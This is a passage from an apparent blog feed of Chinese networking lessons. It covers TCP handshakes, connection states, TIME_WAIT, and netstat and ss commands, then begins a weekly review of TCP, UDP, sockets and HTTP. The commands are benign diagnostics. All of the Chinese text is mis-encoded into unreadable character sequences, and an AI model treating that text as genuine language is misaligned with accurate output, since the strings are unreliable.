class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æŸ¥çœ‹æ‰€æœ‰TCPè¿æ¥</span><br>netstat -ant<br><br><span class="hljs-comment"># ç»Ÿè®¡å„çŠ¶æ€è¿æ¥æ•°</span><br>netstat -ant | awk <span class="hljs-string">&#x27;&#123;print $6&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c<br><br><span class="hljs-comment"># æŸ¥çœ‹ESTABLISHEDè¿æ¥</span><br>netstat -ant | grep ESTABLISHED<br><br><span class="hljs-comment"># æŸ¥çœ‹TIME_WAITè¿æ¥</span><br>netstat -ant | grep TIME_WAIT<br><br><span class="hljs-comment"># ä½¿ç”¨sså‘½ä»¤ï¼ˆæ›´å¿«ï¼‰</span><br>ss -ant<br>ss -ant state established<br>ss -ant state time-wait<br></code></pre></td></tr></table></figure><p><strong>Windows</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æŸ¥çœ‹æ‰€æœ‰TCPè¿æ¥</span><br>netstat -ano<br><br><span class="hljs-comment"># æŸ¥çœ‹æŒ‡å®šç«¯å£</span><br>netstat -ano | findstr :80<br><br><span class="hljs-comment"># æŸ¥çœ‹è¿æ¥ç»Ÿè®¡</span><br>netstat -s -p tcp<br></code></pre></td></tr></table></figure><hr><h2 id="6-å®æˆ˜é¡¹ç›®ï¼šTCPè¿æ¥åˆ†æå·¥å…·"><a href="#6-å®æˆ˜é¡¹ç›®ï¼šTCPè¿æ¥åˆ†æå·¥å…·" class="headerlink" title="6. å®æˆ˜é¡¹ç›®ï¼šTCPè¿æ¥åˆ†æå·¥å…·"></a>6. å®æˆ˜é¡¹ç›®ï¼šTCPè¿æ¥åˆ†æå·¥å…·</h2><h3 id="6-1-é¡¹ç›®åŠŸèƒ½"><a href="#6-1-é¡¹ç›®åŠŸèƒ½" class="headerlink" title="6.1 é¡¹ç›®åŠŸèƒ½"></a>6.1 é¡¹ç›®åŠŸèƒ½</h3><p>å®ç°ä¸€ä¸ªå·¥å…·æ¥ï¼š</p><ol><li>æ¨¡æ‹ŸTCPä¸‰æ¬¡æ¡æ‰‹</li><li>æ•è·å’Œåˆ†æTCPè¿æ¥</li><li>æ˜¾ç¤ºè¿æ¥çŠ¶æ€ç»Ÿè®¡</li><li>æ£€æµ‹å¼‚å¸¸è¿æ¥</li></ol><h3 id="6-2-å·¥å…·æ¼”ç¤º"><a href="#6-2-å·¥å…·æ¼”ç¤º" class="headerlink" title="6.2 å·¥å…·æ¼”ç¤º"></a>6.2 å·¥å…·æ¼”ç¤º</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æŸ¥çœ‹TCPè¿æ¥ç»Ÿè®¡</span><br>python day15_tcp_analyzer.py --stats<br><br><span class="hljs-comment"># ç›‘æ§æŒ‡å®šç«¯å£çš„TCPè¿æ¥</span><br>python day15_tcp_analyzer.py --monitor 80<br><br><span class="hljs-comment"># æµ‹è¯•TCPè¿æ¥</span><br>python day15_tcp_analyzer.py --<span class="hljs-built_in">test</span> www.baidu.com 80<br><br><span class="hljs-comment"># æ˜¾ç¤ºè¿æ¥çŠ¶æ€åˆ†å¸ƒ</span><br>python day15_tcp_analyzer.py --state-distribution<br></code></pre></td></tr></table></figure><hr><h2 id="7-ä»Šæ—¥ç»ƒä¹ "><a href="#7-ä»Šæ—¥ç»ƒä¹ " class="headerlink" title="7. ä»Šæ—¥ç»ƒä¹ "></a>7. ä»Šæ—¥ç»ƒä¹ </h2><h3 id="ç»ƒä¹ 1ï¼šè§‚å¯Ÿä¸‰æ¬¡æ¡æ‰‹"><a href="#ç»ƒä¹ 1ï¼šè§‚å¯Ÿä¸‰æ¬¡æ¡æ‰‹" class="headerlink" title="ç»ƒä¹ 1ï¼šè§‚å¯Ÿä¸‰æ¬¡æ¡æ‰‹"></a>ç»ƒä¹ 1ï¼šè§‚å¯Ÿä¸‰æ¬¡æ¡æ‰‹</h3><p>ä½¿ç”¨WiresharkæŠ“åŒ…ï¼š</p><ol><li>è®¿é—®ä¸€ä¸ªç½‘ç«™ï¼ˆå¦‚<a href="http://www.baidu.com)/">www.baidu.comï¼‰</a></li><li>ç­›é€‰TCPæµï¼š<code>tcp.port == 80</code></li><li>æ‰¾åˆ°ä¸‰æ¬¡æ¡æ‰‹çš„ä¸‰ä¸ªåŒ…</li><li>åˆ†ææ¯ä¸ªåŒ…çš„æ ‡å¿—ä½ã€åºåˆ—å·ã€ç¡®è®¤å·</li></ol><h3 id="ç»ƒä¹ 2ï¼šæŸ¥çœ‹æœ¬æœºTCPè¿æ¥"><a href="#ç»ƒä¹ 2ï¼šæŸ¥çœ‹æœ¬æœºTCPè¿æ¥" class="headerlink" title="ç»ƒä¹ 2ï¼šæŸ¥çœ‹æœ¬æœºTCPè¿æ¥"></a>ç»ƒä¹ 2ï¼šæŸ¥çœ‹æœ¬æœºTCPè¿æ¥</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Linux/Mac</span><br>netstat -ant | grep ESTABLISHED<br>ss -ant state established<br><br><span class="hljs-comment"># Windows</span><br>netstat -ano | findstr ESTABLISHED<br><br>æ€è€ƒï¼š<br>1. æœ‰å¤šå°‘ä¸ªESTABLISHEDè¿æ¥ï¼Ÿ<br>2. å®ƒä»¬è¿æ¥åˆ°å“ªäº›æœåŠ¡å™¨ï¼Ÿ<br>3. æœ‰æ²¡æœ‰TIME_WAITçŠ¶æ€çš„è¿æ¥ï¼Ÿ<br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 3ï¼šè®¡ç®—ä¸‰æ¬¡æ¡æ‰‹æ—¶å»¶"><a href="#ç»ƒä¹ 3ï¼šè®¡ç®—ä¸‰æ¬¡æ¡æ‰‹æ—¶å»¶" class="headerlink" title="ç»ƒä¹ 3ï¼šè®¡ç®—ä¸‰æ¬¡æ¡æ‰‹æ—¶å»¶"></a>ç»ƒä¹ 3ï¼šè®¡ç®—ä¸‰æ¬¡æ¡æ‰‹æ—¶å»¶</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">æŠ“åŒ…åˆ†æï¼š<br>- è®°å½•ç¬¬<span class="hljs-number">1</span>ä¸ªSYNçš„æ—¶é—´æˆ³ï¼š<span class="hljs-built_in">t1</span><br>- è®°å½•ç¬¬<span class="hljs-number">2</span>ä¸ªSYN+ACKçš„æ—¶é—´æˆ³ï¼š<span class="hljs-built_in">t2</span><br>- è®°å½•ç¬¬<span class="hljs-number">3</span>ä¸ªACKçš„æ—¶é—´æˆ³ï¼š<span class="hljs-built_in">t3</span><br><br>è®¡ç®—ï¼š<br>- å®¢æˆ·ç«¯åˆ°æœåŠ¡å™¨RTT: (<span class="hljs-built_in">t2</span> - <span class="hljs-built_in">t1</span>) Ã— <span class="hljs-number">2</span><br>- å®Œæ•´æ¡æ‰‹æ—¶å»¶: <span class="hljs-built_in">t3</span> - <span class="hljs-built_in">t1</span><br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 4ï¼šç†è§£TIME-WAIT"><a href="#ç»ƒä¹ 4ï¼šç†è§£TIME-WAIT" class="headerlink" title="ç»ƒä¹ 4ï¼šç†è§£TIME_WAIT"></a>ç»ƒä¹ 4ï¼šç†è§£TIME_WAIT</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ç¼–å†™ç¨‹åºï¼š<br><span class="hljs-bullet">1.</span> åˆ›å»ºTCPå®¢æˆ·ç«¯<br><span class="hljs-bullet">2.</span> è¿æ¥æœåŠ¡å™¨<br><span class="hljs-bullet">3.</span> ä¸»åŠ¨å…³é—­è¿æ¥<br><span class="hljs-bullet">4.</span> ä½¿ç”¨netstatæŸ¥çœ‹TIME<span class="hljs-emphasis">_WAITçŠ¶æ€</span><br><span class="hljs-emphasis">5. è§‚å¯Ÿ2MSLæ—¶é—´åçŠ¶æ€å˜åŒ–</span><br></code></pre></td></tr></table></figure><hr><h2 id="8-å¸¸è§é—®é¢˜"><a href="#8-å¸¸è§é—®é¢˜" class="headerlink" title="8. å¸¸è§é—®é¢˜"></a>8. å¸¸è§é—®é¢˜</h2><p><strong>Q1ï¼šä¸ºä»€ä¹ˆå»ºç«‹è¿æ¥æ˜¯ä¸‰æ¬¡æ¡æ‰‹ï¼Œå…³é—­è¿æ¥æ˜¯å››æ¬¡æŒ¥æ‰‹ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>å»ºç«‹è¿æ¥ï¼šæœåŠ¡å™¨å¯ä»¥æŠŠSYNå’ŒACKåˆå¹¶åœ¨ä¸€ä¸ªåŒ…ä¸­å‘é€ï¼ˆSYN+ACKï¼‰</li><li>å…³é—­è¿æ¥ï¼šæœåŠ¡å™¨æ”¶åˆ°FINåï¼Œå¯èƒ½è¿˜æœ‰æ•°æ®è¦å‘é€ï¼Œæ‰€ä»¥ACKå’ŒFINè¦åˆ†å¼€å‘é€</li></ul><p><strong>Q2ï¼šå¦‚æœä¸‰æ¬¡æ¡æ‰‹çš„ç¬¬ä¸‰æ¬¡ACKä¸¢å¤±ä¼šæ€æ ·ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>æœåŠ¡å™¨ä¼šé‡ä¼ SYN+ACKï¼ˆæœ€å¤š5æ¬¡ï¼‰</li><li>å®¢æˆ·ç«¯å·²ç»è®¤ä¸ºè¿æ¥å»ºç«‹ï¼Œå¯ä»¥å‘é€æ•°æ®</li><li>æœåŠ¡å™¨æ”¶åˆ°æ•°æ®åŒ…ï¼ˆå«ACKï¼‰åä¹Ÿè®¤ä¸ºè¿æ¥å»ºç«‹</li></ul><p><strong>Q3ï¼šä¸ºä»€ä¹ˆTIME_WAITè¦ç­‰2MSLï¼Ÿ</strong></p><p>Aï¼š</p><ol><li>ç¡®ä¿æœ€åçš„ACKèƒ½å¤Ÿåˆ°è¾¾å¯¹æ–¹ï¼ˆ1ä¸ªMSLï¼‰</li><li>å¦‚æœå¯¹æ–¹æ²¡æ”¶åˆ°ï¼Œé‡ä¼ FINéœ€è¦1ä¸ªMSLè¿”å›</li><li>ç¡®ä¿æ—§è¿æ¥çš„æ‰€æœ‰æ•°æ®åŒ…éƒ½å·²æ¶ˆå¤±</li></ol><p><strong>Q4ï¼šå¤§é‡TIME_WAITè¿æ¥æœ‰ä»€ä¹ˆå±å®³ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>å ç”¨æœ¬åœ°ç«¯å£ï¼ˆå®¢æˆ·ç«¯ï¼‰</li><li>æ¶ˆè€—ç³»ç»Ÿèµ„æºï¼ˆå†…å­˜ã€CPUï¼‰</li><li>å¯èƒ½å¯¼è‡´æ— æ³•å»ºç«‹æ–°è¿æ¥</li></ul><p>è§£å†³ï¼š</p><ul><li>ä½¿ç”¨è¿æ¥æ± </li><li>å¯ç”¨SO_REUSEADDR</li><li>è°ƒæ•´ç³»ç»Ÿå‚æ•°</li></ul><p><strong>Q5ï¼šå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨éƒ½å¯ä»¥ä¸»åŠ¨å…³é—­è¿æ¥å—ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>å¯ä»¥ï¼Œä»»ä½•ä¸€æ–¹éƒ½å¯ä»¥ä¸»åŠ¨å‘é€FIN</li><li>ä¸»åŠ¨å…³é—­æ–¹ä¼šè¿›å…¥TIME_WAITçŠ¶æ€</li><li>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæœåŠ¡å™¨ç«¯é€šå¸¸è®¾è®¡ä¸ºç”±å®¢æˆ·ç«¯ä¸»åŠ¨å…³é—­</li></ul><hr><h2 id="9-æ€»ç»“"><a href="#9-æ€»ç»“" class="headerlink" title="9. æ€»ç»“"></a>9. æ€»ç»“</h2><p>ä»Šå¤©æˆ‘ä»¬å­¦ä¹ äº†ï¼š</p><h3 id="æ ¸å¿ƒçŸ¥è¯†ç‚¹"><a href="#æ ¸å¿ƒçŸ¥è¯†ç‚¹" class="headerlink" title="æ ¸å¿ƒçŸ¥è¯†ç‚¹"></a>æ ¸å¿ƒçŸ¥è¯†ç‚¹</h3><ol><li><p><strong>TCPç‰¹æ€§</strong>ï¼š</p><ul><li>é¢å‘è¿æ¥</li><li>å¯é ä¼ è¾“</li><li>å…¨åŒå·¥é€šä¿¡</li><li>å­—èŠ‚æµæœåŠ¡</li></ul></li><li><p><strong>TCPæŠ¥æ–‡æ ¼å¼</strong>ï¼š</p><ul><li>20å­—èŠ‚å›ºå®šå¤´éƒ¨</li><li>é‡è¦å­—æ®µï¼šåºåˆ—å·ã€ç¡®è®¤å·ã€æ ‡å¿—ä½ã€çª—å£å¤§å°</li></ul></li><li><p><strong>ä¸‰æ¬¡æ¡æ‰‹</strong>ï¼š</p><ul><li>SYN â†’ SYN+ACK â†’ ACK</li><li>ç›®çš„ï¼šç¡®è®¤åŒæ–¹èƒ½åŠ›ã€åå•†å‚æ•°ã€é˜²æ­¢æ—§è¿æ¥</li></ul></li><li><p><strong>å››æ¬¡æŒ¥æ‰‹</strong>ï¼š</p><ul><li>FIN â†’ ACK â†’ FIN â†’ ACK</li><li>åŸå› ï¼šå…¨åŒå·¥ï¼ŒåŒå‘ç‹¬ç«‹å…³é—­</li><li>TIME_WAITï¼šç­‰å¾…2MSL</li></ul></li><li><p><strong>TCPçŠ¶æ€æœº</strong>ï¼š</p><ul><li>11ç§çŠ¶æ€</li><li>çŠ¶æ€è½¬æ¢æ¡ä»¶</li><li>å¼‚å¸¸æƒ…å†µå¤„ç†</li></ul></li></ol><h3 id="é‡ç‚¹å›é¡¾"><a href="#é‡ç‚¹å›é¡¾" class="headerlink" title="é‡ç‚¹å›é¡¾"></a>é‡ç‚¹å›é¡¾</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs scss">TCPä¸‰æ¬¡æ¡æ‰‹ï¼š<br><span class="hljs-number">1</span>ï¸âƒ£ å®¢æˆ·ç«¯ â†’ æœåŠ¡å™¨ï¼šSYN<br><span class="hljs-number">2</span>ï¸âƒ£ æœåŠ¡å™¨ â†’ å®¢æˆ·ç«¯ï¼šSYN+ACK<br><span class="hljs-number">3</span>ï¸âƒ£ å®¢æˆ·ç«¯ â†’ æœåŠ¡å™¨ï¼šACK<br>âœ… è¿æ¥å»ºç«‹<br><br>TCPå››æ¬¡æŒ¥æ‰‹ï¼š<br><span class="hljs-number">1</span>ï¸âƒ£ å®¢æˆ·ç«¯ â†’ æœåŠ¡å™¨ï¼šFIN<br><span class="hljs-number">2</span>ï¸âƒ£ æœåŠ¡å™¨ â†’ å®¢æˆ·ç«¯ï¼šACK<br><span class="hljs-number">3</span>ï¸âƒ£ æœåŠ¡å™¨ â†’ å®¢æˆ·ç«¯ï¼šFIN<br><span class="hljs-number">4</span>ï¸âƒ£ å®¢æˆ·ç«¯ â†’ æœåŠ¡å™¨ï¼šACK<br>â³ TIME_WAIT (<span class="hljs-number">2MS</span>L)<br>âœ… è¿æ¥å…³é—­<br></code></pre></td></tr></table></figure><h3 id="æ˜å¤©é¢„å‘Š"><a href="#æ˜å¤©é¢„å‘Š" class="headerlink" title="æ˜å¤©é¢„å‘Š"></a>æ˜å¤©é¢„å‘Š</h3><p><strong>ç¬¬16å¤©ï¼šTCPå¯é ä¼ è¾“æœºåˆ¶</strong></p><p>å†…å®¹é¢„è§ˆï¼š</p><ul><li>åºåˆ—å·å’Œç¡®è®¤å·è¯¦è§£</li><li>æ»‘åŠ¨çª—å£æœºåˆ¶</li><li>è¶…æ—¶é‡ä¼ </li><li>å¿«é€Ÿé‡ä¼ å’Œå¿«é€Ÿæ¢å¤</li><li>æµé‡æ§åˆ¶</li><li>æ‹¥å¡æ§åˆ¶</li></ul><hr><p><strong>ç»§ç»­åŠ æ²¹ï¼</strong> ğŸš€</p><p>ä»Šå¤©æˆ‘ä»¬æ·±å…¥å­¦ä¹ äº†TCPåè®®çš„åŸºç¡€çŸ¥è¯†ï¼Œç†è§£äº†ä¸‰æ¬¡æ¡æ‰‹å’Œå››æ¬¡æŒ¥æ‰‹çš„å®Œæ•´è¿‡ç¨‹ã€‚è¿™äº›æ˜¯TCPåè®®çš„æ ¸å¿ƒï¼Œä¹Ÿæ˜¯ç½‘ç»œé¢è¯•çš„é«˜é¢‘è€ƒç‚¹ã€‚æ˜å¤©æˆ‘ä»¬å°†å­¦ä¹ TCPå¦‚ä½•å®ç°å¯é ä¼ è¾“ï¼</p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¸‰å‘¨æ€»ç»“ï¼šä¼ è¾“å±‚å’Œåº”ç”¨å±‚åè®®</title>
    <link href="/2025/11/10/%E4%B8%89%E5%91%A8%E6%80%BB%E7%BB%93%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82%E5%92%8C%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE/"/>
    <url>/2025/11/10/%E4%B8%89%E5%91%A8%E6%80%BB%E7%BB%93%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82%E5%92%8C%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬ä¸‰å‘¨æ€»ç»“ï¼šä¼ è¾“å±‚å’Œåº”ç”¨å±‚åè®®"><a href="#ç¬¬ä¸‰å‘¨æ€»ç»“ï¼šä¼ è¾“å±‚å’Œåº”ç”¨å±‚åè®®" class="headerlink" title="ç¬¬ä¸‰å‘¨æ€»ç»“ï¼šä¼ è¾“å±‚å’Œåº”ç”¨å±‚åè®®"></a>ç¬¬ä¸‰å‘¨æ€»ç»“ï¼šä¼ è¾“å±‚å’Œåº”ç”¨å±‚åè®®</h1><h2 id="å­¦ä¹ æ—¶é—´ï¼šç¬¬15-21å¤©"><a href="#å­¦ä¹ æ—¶é—´ï¼šç¬¬15-21å¤©" class="headerlink" title="å­¦ä¹ æ—¶é—´ï¼šç¬¬15-21å¤©"></a>å­¦ä¹ æ—¶é—´ï¼šç¬¬15-21å¤©</h2><hr><h2 id="ğŸ“š-æœ¬å‘¨å­¦ä¹ å†…å®¹"><a href="#ğŸ“š-æœ¬å‘¨å­¦ä¹ å†…å®¹" class="headerlink" title="ğŸ“š æœ¬å‘¨å­¦ä¹ å†…å®¹"></a>ğŸ“š æœ¬å‘¨å­¦ä¹ å†…å®¹</h2><h3 id="Day-15ï¼šTCPåè®®åŸºç¡€"><a href="#Day-15ï¼šTCPåè®®åŸºç¡€" class="headerlink" title="Day 15ï¼šTCPåè®®åŸºç¡€"></a>Day 15ï¼šTCPåè®®åŸºç¡€</h3><ul><li>TCPç‰¹ç‚¹å’Œåº”ç”¨åœºæ™¯</li><li>TCPæŠ¥æ–‡æ ¼å¼</li><li>ä¸‰æ¬¡æ¡æ‰‹å»ºç«‹è¿æ¥</li><li>å››æ¬¡æŒ¥æ‰‹æ–­å¼€è¿æ¥</li><li>TCPçŠ¶æ€æœºï¼ˆ11ç§çŠ¶æ€ï¼‰</li><li>TIME_WAITçš„ä½œç”¨</li><li>SYN Floodæ”»å‡»å’Œé˜²å¾¡</li></ul><h3 id="Day-16ï¼šTCPå¯é ä¼ è¾“æœºåˆ¶"><a href="#Day-16ï¼šTCPå¯é ä¼ è¾“æœºåˆ¶" class="headerlink" title="Day 16ï¼šTCPå¯é ä¼ è¾“æœºåˆ¶"></a>Day 16ï¼šTCPå¯é ä¼ è¾“æœºåˆ¶</h3><ul><li>åºåˆ—å·å’Œç¡®è®¤å·</li><li>è¶…æ—¶é‡ä¼ æœºåˆ¶</li><li>å¿«é€Ÿé‡ä¼ å’Œå¿«é€Ÿæ¢å¤</li><li>æ»‘åŠ¨çª—å£åè®®</li><li>æµé‡æ§åˆ¶</li><li>æ‹¥å¡æ§åˆ¶ç®—æ³•ï¼ˆæ…¢å¯åŠ¨ã€æ‹¥å¡é¿å…ï¼‰</li><li>RTOè®¡ç®—ï¼ˆJacobsonç®—æ³•ï¼‰</li></ul><h3 id="Day-17ï¼šUDPåè®®è¯¦è§£"><a href="#Day-17ï¼šUDPåè®®è¯¦è§£" class="headerlink" title="Day 17ï¼šUDPåè®®è¯¦è§£"></a>Day 17ï¼šUDPåè®®è¯¦è§£</h3><ul><li>UDPç‰¹ç‚¹å’Œåº”ç”¨åœºæ™¯</li><li>UDPæŠ¥æ–‡æ ¼å¼ï¼ˆ8å­—èŠ‚ï¼‰</li><li>UDP vs TCPå¯¹æ¯”</li><li>å¯é UDPå®ç°</li><li>UDPå¹¿æ’­å’Œå¤šæ’­</li><li>UDPåº”ç”¨ï¼šDNSã€DHCPã€éŸ³è§†é¢‘</li></ul><h3 id="Day-18ï¼šSocketç¼–ç¨‹è¿›é˜¶"><a href="#Day-18ï¼šSocketç¼–ç¨‹è¿›é˜¶" class="headerlink" title="Day 18ï¼šSocketç¼–ç¨‹è¿›é˜¶"></a>Day 18ï¼šSocketç¼–ç¨‹è¿›é˜¶</h3><ul><li>é˜»å¡vséé˜»å¡Socket</li><li>IOå¤šè·¯å¤ç”¨ï¼ˆselect&#x2F;poll&#x2F;epollï¼‰</li><li>Socketé€‰é¡¹é…ç½®</li><li>é«˜æ€§èƒ½æœåŠ¡å™¨æ¶æ„</li><li>C10Ké—®é¢˜å’Œè§£å†³æ–¹æ¡ˆ</li><li>å®æˆ˜ï¼šå¤šäººèŠå¤©å®¤</li></ul><h3 id="Day-19ï¼šHTTPåè®®åŸºç¡€"><a href="#Day-19ï¼šHTTPåè®®åŸºç¡€" class="headerlink" title="Day 19ï¼šHTTPåè®®åŸºç¡€"></a>Day 19ï¼šHTTPåè®®åŸºç¡€</h3><ul><li>HTTPå·¥ä½œåŸç†</li><li>HTTPè¯·æ±‚å’Œå“åº”æ ¼å¼</li><li>HTTPæ–¹æ³•ï¼ˆGETã€POSTã€PUTã€DELETEç­‰ï¼‰</li><li>HTTPçŠ¶æ€ç ï¼ˆ1xx-5xxï¼‰</li><li>Cookieå’ŒSessionæœºåˆ¶</li><li>HTTPç‰ˆæœ¬æ¼”è¿›ï¼ˆ1.0&#x2F;1.1&#x2F;2&#x2F;3ï¼‰</li><li>å®æˆ˜ï¼šHTTPæœåŠ¡å™¨</li></ul><h3 id="Day-20ï¼šHTTPSå’Œå®‰å…¨"><a href="#Day-20ï¼šHTTPSå’Œå®‰å…¨" class="headerlink" title="Day 20ï¼šHTTPSå’Œå®‰å…¨"></a>Day 20ï¼šHTTPSå’Œå®‰å…¨</h3><ul><li>åŠ å¯†åŸºç¡€ï¼ˆå¯¹ç§°åŠ å¯†ã€éå¯¹ç§°åŠ å¯†ã€å“ˆå¸Œï¼‰</li><li>TLS&#x2F;SSLåè®®</li><li>HTTPSæ¡æ‰‹è¿‡ç¨‹ï¼ˆTLS 1.2ã€TLS 1.3ï¼‰</li><li>æ•°å­—è¯ä¹¦å’ŒCA</li><li>å¸¸è§Webå®‰å…¨æ”»å‡»</li><li>å®‰å…¨æœ€ä½³å®è·µ</li><li>å®æˆ˜ï¼šHTTPSæœåŠ¡å™¨</li></ul><h3 id="Day-21ï¼šç»¼åˆå®æˆ˜"><a href="#Day-21ï¼šç»¼åˆå®æˆ˜" class="headerlink" title="Day 21ï¼šç»¼åˆå®æˆ˜"></a>Day 21ï¼šç»¼åˆå®æˆ˜</h3><ul><li>çŸ¥è¯†ç‚¹å›é¡¾</li><li>æ€§èƒ½ä¼˜åŒ–æŠ€å·§</li><li>è°ƒè¯•å’Œæ’é”™æ–¹æ³•</li><li>å·¥å…·å’Œèµ„æºæ¨è</li><li>å®æˆ˜ï¼šå®‰å…¨Webåº”ç”¨å¹³å°</li></ul><hr><h2 id="ğŸ¯-æ ¸å¿ƒçŸ¥è¯†ç‚¹"><a href="#ğŸ¯-æ ¸å¿ƒçŸ¥è¯†ç‚¹" class="headerlink" title="ğŸ¯ æ ¸å¿ƒçŸ¥è¯†ç‚¹"></a>ğŸ¯ æ ¸å¿ƒçŸ¥è¯†ç‚¹</h2><h3 id="1-TCPåè®®"><a href="#1-TCPåè®®" class="headerlink" title="1. TCPåè®®"></a>1. TCPåè®®</h3><p><strong>ä¸‰æ¬¡æ¡æ‰‹</strong>ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss">å®¢æˆ·ç«¯                 æœåŠ¡å™¨<br>  â”‚                      â”‚<br>  â”‚â”€â”€â”€â”€â”€â”€â”€ SYN â”€â”€â”€â”€â”€â”€â”€â”€â†’â”‚  (<span class="hljs-number">1</span>)<br>  â”‚â†â”€â”€â”€â”€ SYN-ACK â”€â”€â”€â”€â”€â”€â”€â”‚  (<span class="hljs-number">2</span>)<br>  â”‚â”€â”€â”€â”€â”€â”€â”€ ACK â”€â”€â”€â”€â”€â”€â”€â”€â†’â”‚  (<span class="hljs-number">3</span>)<br>  â”‚                      â”‚<br> è¿æ¥å»ºç«‹<br></code></pre></td></tr></table></figure><p><strong>å››æ¬¡æŒ¥æ‰‹</strong>ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scss">å®¢æˆ·ç«¯                 æœåŠ¡å™¨<br>  â”‚                      â”‚<br>  â”‚â”€â”€â”€â”€â”€â”€â”€ FIN â”€â”€â”€â”€â”€â”€â”€â”€â†’â”‚  (<span class="hljs-number">1</span>)<br>  â”‚â†â”€â”€â”€â”€â”€â”€ ACK â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚  (<span class="hljs-number">2</span>)<br>  â”‚â†â”€â”€â”€â”€â”€â”€ FIN â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚  (<span class="hljs-number">3</span>)<br>  â”‚â”€â”€â”€â”€â”€â”€â”€ ACK â”€â”€â”€â”€â”€â”€â”€â”€â†’â”‚  (<span class="hljs-number">4</span>)<br>  â”‚                      â”‚<br> è¿æ¥å…³é—­<br></code></pre></td></tr></table></figure><p><strong>å…³é”®æ¦‚å¿µ</strong>ï¼š</p><ul><li>åºåˆ—å·ï¼šæ ‡è¯†å‘é€çš„æ¯ä¸ªå­—èŠ‚</li><li>ç¡®è®¤å·ï¼šæœŸæœ›æ¥æ”¶çš„ä¸‹ä¸€ä¸ªåºåˆ—å·</li><li>æ»‘åŠ¨çª—å£ï¼šæµé‡æ§åˆ¶</li><li>æ‹¥å¡çª—å£ï¼šæ‹¥å¡æ§åˆ¶</li><li>TIME_WAITï¼š2MSLç­‰å¾…æ—¶é—´</li></ul><h3 id="2-UDPåè®®"><a href="#2-UDPåè®®" class="headerlink" title="2. UDPåè®®"></a>2. UDPåè®®</h3><p><strong>ç‰¹ç‚¹</strong>ï¼š</p><ul><li>æ— è¿æ¥ã€ä¸å¯é ã€å¿«é€Ÿ</li><li>8å­—èŠ‚å¤´éƒ¨ï¼ˆæºç«¯å£ã€ç›®æ ‡ç«¯å£ã€é•¿åº¦ã€æ ¡éªŒå’Œï¼‰</li><li>é€‚åˆå®æ—¶åº”ç”¨</li></ul><p><strong>ä½¿ç”¨åœºæ™¯</strong>ï¼š</p><ul><li>å®æ—¶éŸ³è§†é¢‘</li><li>åœ¨çº¿æ¸¸æˆ</li><li>DNSæŸ¥è¯¢</li><li>æµåª’ä½“</li></ul><h3 id="3-Socketç¼–ç¨‹"><a href="#3-Socketç¼–ç¨‹" class="headerlink" title="3. Socketç¼–ç¨‹"></a>3. Socketç¼–ç¨‹</h3><p><strong>IOå¤šè·¯å¤ç”¨å¯¹æ¯”</strong>ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 